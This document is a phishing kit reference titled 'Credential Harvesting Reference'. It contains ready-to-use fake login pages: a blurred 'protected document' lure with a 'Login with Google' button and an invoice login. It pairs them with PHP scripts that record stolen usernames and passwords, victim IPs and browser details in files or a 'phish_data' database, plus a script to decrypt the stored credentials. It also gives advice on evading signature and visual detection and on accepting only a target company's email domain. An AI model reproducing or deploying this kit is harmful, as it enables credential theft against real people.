# Credential Harvesting Reference

## Login Page Design Principles

- **Avoid exact clones** of major brands — use similar color schemes/layouts without logos or brand names
- **Mobile responsive** — always include `@media` queries
- **Custom over public templates** — public templates are heavily signatured
- **Form action** should point to a separate PHP handler script
- **Method** should always be POST for credential forms

---

## Template 1: Protected Document (Blurred Background)

Uses a blurred document image as background with a login overlay. The user believes they must authenticate to view the shared document.

```html
<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Protected Document</title>
<style>
    body {
        background-image: url('cover.png');
        background-size: contain;
        background-position: center;
        background-repeat: no-repeat;
        background-color: darkgrey;
        height: 100vh; margin: 0;
        display: flex; justify-content: center; align-items: center;
        text-align: center; font-family: Arial, sans-serif;
    }
    .login-box {
        background: #f1f1f1; padding: 30px; border-radius: 10px;
        box-shadow: 0 20px 20px rgba(0,0,0,0.1); max-width: 350px; width: 100%;
    }
    .login-box h2 { color: #333; margin-bottom: 10px; }
    .login-box p { color: #666; font-size: 14px; margin-bottom: 20px; }
    .login-box input {
        margin: 10px 0; padding: 12px; width: 100%;
        border: 1px solid #ddd; border-radius: 5px; box-sizing: border-box; font-size: 16px;
    }
    .login-box button {
        display: flex; align-items: center; justify-content: center; gap: 8px;
        padding: 12px 20px; border: 1px solid #cbd5e1; border-radius: 10px;
        background-color: white; color: #334155; cursor: pointer; font-size: 16px;
        width: 100%; margin: 10px 0; box-sizing: border-box;
    }
    .login-box button:hover { border-color: #94a3b8; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
    @media (max-width: 600px) {
        body { padding: 20px; background-size: cover; }
        .login-box { padding: 20px; }
    }
</style></head>
<body>
<div class="login-box">
    <h2>Protected Document</h2>
    <p>John shared with you HRPolicy.pdf</p>
    <form action="submit.php" method="POST">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Login with Google</button>
    </form>
</div>
</body></html>
```

## Template 2: Generic Login (No Brand References)

Orange color scheme, no logos, no brand names — undetectable by visual analysis.

```html
<!DOCTYPE html>
<html><head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Login</title>
<style>
    body { background-color: #f6f9fc; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; }
    .login-container { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); max-width: 400px; width: 100%; text-align: center; }
    .login-container h2 { margin-bottom: 20px; color: #32325d; font-size: 24px; }
    .login-container input { width: 100%; padding: 12px 20px; margin: 10px 0; border: 1px solid #dcdfe6; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
    .login-container button { width: 100%; padding: 12px 20px; margin: 20px 0; background-color: #f48120; border: none; border-radius: 4px; color: white; font-size: 16px; cursor: pointer; }
    .login-container button:hover { background-color: #cc6b1a; }
    .login-container a { color: #f48120; text-decoration: none; }
</style></head>
<body>
<div class="login-container">
    <h2>Log in to View Invoice</h2>
    <form action="submit.php" method="POST">
        <input type="email" name="username" placeholder="Email" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <button type="submit">Log In</button>
    </form>
    <a href="#">Forgot your password?</a>
</div>
</body></html>
```

---

## PHP Backend: Basic Credential Logging

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $logEntry = "Username: " . $username . " | Password: " . $password . "\n";
    $logFile = '/var/www/credentials_log.txt';
    file_put_contents($logFile, $logEntry, FILE_APPEND);
    header('Location: https://www.google.com');
    exit();
}
?>
```

## PHP Backend: AES-Encrypted Credential Logging

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $encryption_key = '01234567890123456789012345678901';
    $iv = '0123456789012345';

    function encrypt_data($data, $key, $iv) {
        $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
        return base64_encode($encrypted);
    }

    $encrypted_username = encrypt_data($username, $encryption_key, $iv);
    $encrypted_password = encrypt_data($password, $encryption_key, $iv);
    $logEntry = "Username: " . $encrypted_username . " | Password: " . $encrypted_password . "\n";
    $logFile = '/var/www/credentials_log.txt';
    file_put_contents($logFile, $logEntry, FILE_APPEND);
    header('Location: https://www.google.com');
    exit();
}
?>
```

## PHP: Decrypt Stored Credentials

```php
<?php
$encryption_key = '01234567890123456789012345678901';
$iv = '0123456789012345';

function decrypt_data($data, $key, $iv) {
    $data = base64_decode($data);
    return openssl_decrypt($data, 'aes-256-cbc', $key, 0, $iv);
}

$logFile = 'credentials_log.txt';
$entries = file($logFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$handle = fopen('decrypted.txt', 'w');

if ($handle) {
    foreach ($entries as $entry) {
        if (preg_match('/Username: (.+?) \| Password: (.+)/', $entry, $m)) {
            $u = decrypt_data($m[1], $encryption_key, $iv);
            $p = decrypt_data($m[2], $encryption_key, $iv);
            fwrite($handle, "Username: $u | Password: $p\n");
        }
    }
    fclose($handle);
}
?>
```

## PHP: Metadata Collection

```php
<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $ip_address = $_SERVER['REMOTE_ADDR'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $referral_url = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : 'N/A';
    $submission_time = date('Y-m-d H:i:s');

    $logEntry = "Username: $username\nPassword: $password\nIP: $ip_address\nUA: $user_agent\nRef: $referral_url\nTime: $submission_time\n\n";
    file_put_contents('/var/www/credentials_log.txt', $logEntry, FILE_APPEND);
    header('Location: https://www.google.com');
    exit();
}
?>
```

## PHP: MySQL Storage

```php
<?php
$servername = "localhost";
$username = "dbuser";
$password = "PASSWORD";
$dbname = "phish_data";

try {
    $conn = new PDO("mysql:host=$servername;dbname=$dbname", $username, $password);
    $conn->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
    $ip = $_SERVER['REMOTE_ADDR'];
    $stmt = $conn->prepare("INSERT INTO visitors (ip_address) VALUES (:ip)");
    $stmt->bindParam(':ip', $ip);
    $stmt->execute();
} catch(PDOException $e) {
}
$conn = null;
?>
```

## Frontend Input Validation

```html
<script>
function validateInputs() {
    var email = document.getElementById('username').value;
    var password = document.getElementById('password').value;
    var emailPattern = /^[a-zA-Z0-9._%+-]+@company\.com$/;
    var passwordPattern = /^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/;
    var btn = document.getElementById('submit-button');
    btn.disabled = !(emailPattern.test(email) && passwordPattern.test(password));
}
</script>
<input type="text" id="username" name="username" oninput="validateInputs()" required>
<input type="password" id="password" name="password" oninput="validateInputs()" required>
<button type="submit" id="submit-button" disabled>Log In</button>
```

## Backend Input Validation (PHP with Session Error)

```php
<?php
session_start();
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];
    $emailPattern = "/^[a-zA-Z0-9._%+-]+@company\.com$/";
    $passwordPattern = "/^(?=.*[0-9])(?=.*[!@#$%^&*])[a-zA-Z0-9!@#$%^&*]{8,}$/";

    if (preg_match($emailPattern, $username) && preg_match($passwordPattern, $password)) {
        $logEntry = "Username: $username | Password: $password\n";
        file_put_contents('/var/www/credentials_log.txt', $logEntry, FILE_APPEND);
        header('Location: https://www.google.com');
        exit();
    } else {
        $_SESSION['error'] = "Incorrect username or password.";
        header('Location: /login.php');
        exit();
    }
}
?>
```

### Display Session Error on Login Page
```php
<?php session_start(); ?>
<?php if (isset($_SESSION['error'])): ?>
<div class="error-message"><?php echo $_SESSION['error']; unset($_SESSION['error']); ?></div>
<?php endif; ?>
```
